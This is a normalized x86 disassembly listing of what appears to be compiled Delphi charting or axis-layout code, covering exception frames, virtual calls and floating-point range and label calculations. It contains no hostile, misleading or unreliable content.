push sub_4816f9
lea eax [ ebp - 0xc ]
call sub_404094
retn
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x60 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_481d5c
sub_481704
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx eax
xor eax eax
push ebp
push j_sub_403a98#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xb4 ]
mov esi eax
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x60 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4818d2
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4040b8
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xfc ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x10 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x7c ]
call sub_409b14
cmp [ ebp - 0x1 ] 0x3
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
mov edi eax
mov eax edi
call sub_47f498
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
cmp [ ebp - 0x1 ] 0x4
jne r-xdata
mov eax edi
call sub_47f498
fld [ r-xdata ]
fmul [ ebp - 0x10 ]
fdivrp st1
fstp [ ebp - 0x18 ]
fwait
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x40590000
jmp r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
cmp eax 0x5
ja r-xdata
jmp [ eax * 4 + r-xdata ]
fld [ ebp - 0x18 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x6c ]
call sub_409b14
push [ ebp - 0x1c ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_404414
jmp r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
push r-xdata
push [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_404414
jmp r-xdata
push [ ebp - 0x20 ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_404414
jmp r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
push r-xdata
push [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_404414
jmp r-xdata
mov edi [ ebx + 0x50 ]
test edi edi
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_47c050
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp + 0x8 ]
mov eax [ ebx + 0x7c ]
call sub_409b14
jmp r-xdata
sub_4818e7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xac ]
test al al
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ esi + 0x84 ]
mov dl [ eax + 0x4 ]
mov eax [ ebx + 0x84 ]
call sub_47f5b0
mov eax [ esi + 0x8c ]
mov dl [ eax + 0x4 ]
mov eax [ ebx + 0x8c ]
call sub_47f5b0
mov edx esi
mov eax [ ebx + 0xa4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax esi
call sub_481f8c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_481990
inc edi
mov [ esp ] 0x0
mov ecx [ esp ]
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x34 ]
inc [ esp ]
dec edi
jne r-xdata
jmp r-xdata
sub_4819a8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp [ eax + 0x22c ] 0x0
je r-xdata
xor eax eax
mov eax [ eax + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor ebp ebp
inc ebp
dec edi
jne r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x68 ]
call sub_483fd0
mov esi eax
cmp ebx esi
je r-xdata
cmp [ esi + 0xfb ] 0x0
jne r-xdata
mov eax esi
call sub_4834d4
push eax
mov eax ebx
call sub_4834d4
pop edx
cmp edx eax
jne r-xdata
mov al 0x1
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_481a10
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0x0
mov [ esp ] 0x1
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
cmp [ esi + 0x30 ] 0x0
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax esi
call sub_4834d4
push eax
mov eax ebx
call sub_4834d4
pop edx
cmp edx eax
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x68 ]
call sub_483fd0
mov esi eax
cmp ebx esi
je r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
sub_481abc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_481cac
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov eax [ ebx + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebx + 0x5c ]
sub edx eax
jl r-xdata
mov eax esi
call sub_403344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481cb3
lea eax [ ebp - 0x8 ]
call sub_404094
retn
inc edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
inc [ ebp - 0x4 ]
dec [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_482144
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_481e6c
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_477be4
mov edi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x60 ]
add edi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
call sub_472f94
imul [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
call sub_472e8c
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
jne r-xdata
mov [ esi + 0x24 ] edi
mov eax [ ebp - 0xc ]
mov [ esi + 0x18 ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov [ esi + 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe8 ]
mov [ esi + 0x10 ] eax
mov eax [ esi + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x10 ]
mov [ esi + 0x8 ] eax
sar edi 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_41d7e4
add eax eax
add edi eax
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x27c ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
sub eax edi
mov [ esi + 0x1c ] eax
mov eax [ esi + 0x10 ]
sub eax [ ebp - 0xc ]
inc eax
mov [ esi + 0x20 ] eax
push esi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x54 ]
adc edi 0x0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
mov edi [ eax + 0x8 ]
mov eax edi
call sub_41d458
mov [ ebp - 0x1c ] eax
fild [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x27c ]
fild [ eax + 0x20 ]
fld [ r-xdata ]
fmulp st1
fmulp st1
call sub_402b00
mov edx eax
mov eax 0x1
call sub_476954
mov edx eax
mov eax edi
call sub_41d474
sub_481cec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov ecx eax
mov edx esi
mov eax [ ebx + 0x64 ]
call sub_47fb1c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_481d28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ esi ]
mov edx edi
call sub_4044a0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx edi
call sub_4040e8
mov eax ebx
call sub_481450
sub_481d5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_482b94
mov ecx eax
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_414438
pop edi
pop esi
pop ebx
retn
sub_481d84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
or esi 0xffffffff
mov eax [ ebx + 0x84 ]
mov edx [ ebp + 0x10 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x3c ] edx
mov eax [ ebx + 0x8c ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
cmp [ ebx + 0xca ] 0x0
je r-xdata
mov eax [ ebx + 0x84 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov esi eax
mov edi [ ebx + 0x8c ]
push [ edi + 0x3c ]
push [ edi + 0x38 ]
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x3c ]
call sub_414438
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_481d5c
mov ecx esi
mov edx ebx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x6c ]
mov edx ebx
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
test al al
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_481e30
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
call sub_483268
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov ecx esi
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
pop esi
pop ebx
retn
mov eax ebx
call sub_481450
sub_481e6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
cmp eax 0x1fffffff
sete al
pop esi
pop ebx
retn
sub_481e9c
push ebp
mov ebp esp
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx 0x1fffffff
mov ebx [ eax ]
call [ ebx + 0x90 ]
pop ebx
pop ebp
retn 0x10
sub_481ec0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_480b24
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_481f04
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_481f48
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_481f04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x90 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_481f48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x90 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_481fa0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push j_sub_403a98#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
mov esi eax
mov eax esi
call sub_47f498
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x40590000
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xfc ]
fabs
fmul [ r-xdata ]
fstp [ ebp - 0x1c ]
fwait
mov eax esi
call sub_47f498
fld [ ebp - 0x1c ]
fdivrp st1
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4820a5
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4040b8
retn
push 0x1
mov eax [ edi ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xb
mov eax esi
call sub_47f498
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0x7c ]
call sub_409b14
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xb
lea eax [ ebp - 0x2c ]
push eax
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x34 ]
mov eax edi
pop ecx
call sub_4090a8
fld [ ebp - 0x10 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx edi
mov eax [ ebx + 0x6c ]
call sub_409b14
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub_4820d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4820f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov ecx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x60 ]
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xfc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_409b14
sub_482144
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_482380
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
movzx eax [ eax + 0x1c ]
cmp eax 0x8
ja r-xdata
mov eax [ ebp - 0x8 ]
call sub_404094
jmp [ eax * 4 + jump_table_482189 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482387
lea eax [ ebp - 0x24 ]
mov edx 0x7
call sub_4040b8
retn
mov eax [ ebp - 0x8 ]
push eax
mov esi [ ebp - 0x4 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0xec ]
call [ esi + 0xe8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xfc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_409b14
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_481fa0
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4820f8
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4040e8
jmp r-xdata
push ebp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4820f8
pop ecx
push [ ebp - 0x10 ]
push r-xdata
lea eax [ ebp - 0x14 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_481fa0
push [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404414
jmp r-xdata
push ebp
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_4820f8
pop ecx
push [ ebp - 0x18 ]
push r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xfc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_409b14
push [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404414
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x10c ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_481fa0
jmp r-xdata
push ebp
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_4820f8
pop ecx
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_481fa0
push [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404414
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x50 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xea ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_47c050
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_409b14
jmp r-xdata
sub_4823b4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx 0x4
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa4 ]
xor edx edx
mov eax [ esi + 0x64 ]
call sub_47f810
mov [ esi + 0x38 ] 0x0
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov edx 0xc0c0c0
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x80 ]
sub_4823f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
call sub_402a7c
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x408f4000
cmp [ ebx + 0x68 ] 0x0
je r-xdata
mov eax [ ebx + 0x84 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x68 ]
call sub_484ab4
test eax eax
jle r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
dec eax
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fstp [ ebp - 0x18 ]
fwait
call sub_409fd4
fstp [ ebp - 0x10 ]
fwait
fild [ ebp - 0x4 ]
fadd [ ebp - 0x10 ]
fsub [ r-xdata ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
mov edx [ ebx + 0x54 ]
mov eax [ ebx + 0x68 ]
call sub_483dac
fstp [ edi ]
fwait
mov edx [ ebx + 0x54 ]
mov eax [ ebx + 0x68 ]
call sub_483d7c
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0x20 ]
fcomp [ edi ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x20 ]
fsub [ edi ]
fstp [ esi ]
fwait
fld [ r-xdata ]
fcomp [ esi ]
fnstsw ax
sahf
jae r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
mov eax [ ebp + 0x14 ]
fdivr [ eax ]
mov eax [ ebp + 0x14 ]
fstp [ eax ]
fwait
fld [ ebp - 0x18 ]
fsub [ ebp - 0x10 ]
mov eax [ ebp + 0x14 ]
fstp [ eax ]
fwait
cmp [ ebp - 0x4 ] 0x1
jle r-xdata
mov edx [ ebx + 0x50 ]
mov eax [ ebx + 0x68 ]
call sub_483d94
fstp [ ebp - 0x10 ]
fwait
mov edx [ ebx + 0x50 ]
mov eax [ ebx + 0x68 ]
call sub_483d64
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x18 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x20 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ r-xdata ]
fcomp [ esi ]
fnstsw ax
sahf
jbe r-xdata
mov [ esi ] 0xffc00000
mov [ esi + 0x4 ] 0x41dfffff
jmp r-xdata
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ r-xdata ]
fmul [ edi ]
fstp [ ebp - 0x20 ]
fwait
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x408f4000
jmp r-xdata
fld [ esi ]
call sub_402b00
call sub_402d64
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fadd [ edi ]
mov eax [ ebp + 0x10 ]
fstp [ eax ]
fwait
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ esi ] 0xffc00000
mov [ esi + 0x4 ] 0xc1dfffff
fld [ r-xdata ]
fmul [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
fild [ ebp - 0x4 ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
sub_4825d6
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x34 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a98#6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx esi
mov eax ebx
call sub_4823f8
push 0x0
push 0x4
fld [ ebp - 0x30 ]
call sub_402b00
call sub_404e8c
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
test esi esi
jle r-xdata
mov [ eax + 0x28c ] 0x0
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_402d64
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fadd [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
sar eax 0x1
jns r-xdata
mov eax ebx
call sub_481990
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4826ee
lea eax [ ebp - 0x34 ]
call sub_404094
retn
mov [ eax + 0x28c ] 0x1
mov [ ebp - 0x3c ] eax
fild [ ebp - 0x3c ]
fsubp st1
fabs
fstp [ ebp - 0x20 ]
fwait
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov ecx 0x20000000
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x90 ]
fld [ ebp - 0x18 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fwait
dec esi
jne r-xdata
adc eax 0x0
sub_4826f8
push ebx
push esi
mov ebx edx
mov esi [ eax + 0x68 ]
mov edx ebx
mov eax esi
call sub_47778c
mov edx ebx
xor dl 0x1
mov eax esi
call sub_4848f4
pop esi
pop ebx
retn
sub_482724
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4143bc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_480d44
inc esi
dec ebx
jne r-xdata
sub_482764
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_482a37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4149b4
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_480fd8
mov eax [ ebp - 0x4 ]
call sub_480b24
test al al
je r-xdata
mov esi ebx
mov edx [ esi + 0x84 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
